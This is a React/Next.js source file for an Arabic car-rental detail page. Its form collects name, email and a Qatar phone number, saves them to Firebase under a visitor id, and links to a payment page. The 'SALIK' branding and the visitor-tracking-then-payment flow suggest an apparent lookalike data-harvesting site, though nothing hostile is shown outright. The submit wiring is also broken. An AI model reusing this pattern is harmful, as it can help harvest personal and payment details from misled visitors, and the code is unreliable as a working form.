"use client"
import Link from "next/link"
import { notFound } from "next/navigation"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Calendar, Clock, Users, Briefcase, Car, ChevronLeft, Star, Shield } from "lucide-react"
import { Badge } from "@/components/ui/badge"
import { ReactElement, JSXElementConstructor, ReactNode, ReactPortal, PromiseLikeOfReactNode, Key, useState } from "react"
import { getCarById } from "@/lib/cars"
import { addData } from "@/lib/firebase"

export default function CarDetailPage({ params }: { params: { id: string } }) {
 const [name,setName]=useState('')
 const [email,setEmail]=useState('')
 const [phone,setPhone]=useState('')
  const car = getCarById(params.id)

  if (!car) {
    notFound()
  }
  const handleSubmit=(e:React.FormEvent)=>{
    e.preventDefault()
    const visitorId = localStorage.getItem('visitor');

    // If validation passes, proceed with payment
    addData({id:visitorId!,name,email,phone})

  }
  return (
    <div className="flex flex-col min-h-screen bg-white text-right">
  
      {/* Car Hero Section */}
      <div className="relative">
        <img
          src={car.image || "/placeholder.svg"}
          alt={car.name}
          width={500}
          height={300}
          className="w-full h-72 object-cover rounded-b-3xl"
        />
        <div className="absolute inset-0 bg-gradient-to-t from-black/60 to-transparent rounded-b-3xl"></div>
        <div className="absolute bottom-0 right-0 p-6 text-white">
          <h1 className="text-2xl font-bold mb-1">{car.name}</h1>
          <div className="flex gap-3 text-sm">
            <span>الرئيسية</span>
            <ChevronLeft className="h-5 w-5" />
            <span>للاستئجار</span>
          </div>
        </div>
        <div className="absolute top-4 left-4 flex items-center gap-1 bg-yellow-400 text-black font-bold px-2 py-1 rounded-lg text-sm">
          <Star className="h-4 w-4 fill-black" />
          <span>{car.rating}</span>
        </div>
      </div>

      {/* Book Now Button */}
      <div className="px-4 -mt-5 relative z-10">
        <Button className="w-full bg-sky-500 hover:bg-sky-600 py-6 rounded-xl font-bold text-lg">حجز مباشر</Button>
      </div>

      {/* Car Details */}
      <div className="p-4 bg-gray-100 mt-4">
        <div className="flex justify-between items-center">
          <div className="text-gray-500">
            <span>النوع: </span>
            <span className="font-medium text-black">
              {car.type === "suv" ? "دفع رباعي" : car.type === "sedan" ? "سيدان" : car.type}
            </span>
          </div>
          <div className="flex gap-6">
            <div className="flex flex-col items-center">
              <div className="flex items-center gap-1 text-sky-500">
                <Users className="h-5 w-5" />
                <span className="font-bold">{car.seats}</span>
              </div>
              <span className="text-xs text-gray-500">الركاب</span>
            </div>
            <div className="flex flex-col items-center">
              <div className="flex items-center gap-1 text-sky-500">
                <svg
                  xmlns="http://www.w3.org/2000/svg"
                  width="20"
                  height="20"
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke="currentColor"
                  strokeWidth="2"
                  strokeLinecap="round"
                  strokeLinejoin="round"
                  className="h-5 w-5"
                >
                  <path d="M3 9h18V5H3v4zm0 5h18" />
                  <path d="M3 14v5h18v-5" />
                </svg>
                <span className="font-bold">{car.doors}</span>
              </div>
              <span className="text-xs text-gray-500">الأبواب</span>
            </div>
            <div className="flex flex-col items-center">
              <div className="flex items-center gap-1 text-sky-500">
                <Briefcase className="h-5 w-5" />
                <span className="font-bold">2</span>
              </div>
              <span className="text-xs text-gray-500">الحقائب</span>
            </div>
          </div>
        </div>
      </div>

      {/* Car Description */}
      <div className="p-4 border-b">
        <h2 className="text-lg font-bold mb-3">وصف السيارة</h2>
        <p className="text-gray-600 leading-relaxed mb-4">{car.description}</p>

        <h3 className="font-bold mb-3">المميزات</h3>
        <div className="flex flex-wrap gap-2 mb-4">
          {car.features?.map((feature: string | number | boolean | ReactElement<any, string | JSXElementConstructor<any>> | Iterable<ReactNode> | ReactPortal | PromiseLikeOfReactNode | null | undefined, index: Key | null | undefined) => (
            <Badge key={index} variant="outline" className="px-3 py-1 rounded-full">
              {feature}
            </Badge>
          ))}
        </div>

        <div className="flex items-center gap-2 text-sm text-gray-500 bg-gray-50 p-3 rounded-lg mb-4">
          <Shield className="h-5 w-5 text-green-600" />
          <span>جميع سياراتنا مؤمنة بالكامل وتخضع للصيانة الدورية</span>
        </div>
      </div>

      {/* Booking Form */}
      <div className="p-4">
        <h2 className="text-xl font-bold mb-4">استأجر الآن</h2>

        <form className="space-y-4">
          <div className="space-y-2">
            <label className="text-sm text-gray-600 flex items-center gap-1">
              <span>الاسم بالكامل</span>
              <span className="text-red-500">*</span>
            </label>
            <Input type="text" onChange={(e)=>setName(e.target.value)} placeholder="أدخل اسمك هنا" className="border-gray-300 rounded-lg py-5 text-right" />
          </div>

          <div className="space-y-2">
            <label className="text-sm text-gray-600 flex items-center gap-1">
              <span>البريد الإلكتروني</span>
              <span className="text-red-500">*</span>
            </label>
            <Input
            onChange={(e)=>setEmail(e.target.value)}
              type="email"
              placeholder="أدخل بريدك الإلكتروني هنا"
              className="border-gray-300 rounded-lg py-5 text-right"
            />
          </div>

          <div className="space-y-2">
            <label className="text-sm text-gray-600 flex items-center gap-1">
              <span>رقم الهاتف</span>
              <span className="text-red-500">*</span>
            </label>
            <div className="flex gap-2">
              <Input
                type="tel"
                maxLength={11}
                onChange={(e:any)=>setPhone(e.target.value)}

                placeholder="0000 000 0000"
                className="border-gray-300 rounded-lg py-5 text-right flex-1"
              />
              <div className="border border-gray-300 rounded-lg px-3 flex items-center justify-center bg-gray-50 text-gray-500">
                <span>+974</span>
              </div>
            </div>
          </div>

    
          <Link href="/payment">
            <Button onSubmit={handleSubmit} className="w-full bg-sky-500 my-4 hover:bg-green-600 py-6 rounded-xl font-bold text-lg flex items-center justify-center gap-2">
              <span>المتابعة للدفع</span>
            </Button>
          </Link>
        </form>
      </div>

      {/* Footer */}
      <footer className="mt-auto bg-sky-500 text-white p-6 rounded-t-3xl">
        <div className="flex justify-center mb-4">
          <div className="bg-white rounded-full p-2">
            <Car className="h-6 w-6 text-sky-500" />
          </div>
        </div>
        <div className="text-center">
          <h3 className="text-xl font-bold mb-1">سالك</h3>
          <p className="text-sm opacity-80 mb-4">SALIK</p>
          <p className="text-sm opacity-90">جميع الحقوق محفوظة © 2023</p>
        </div>
      </footer>
    </div>
  )
}
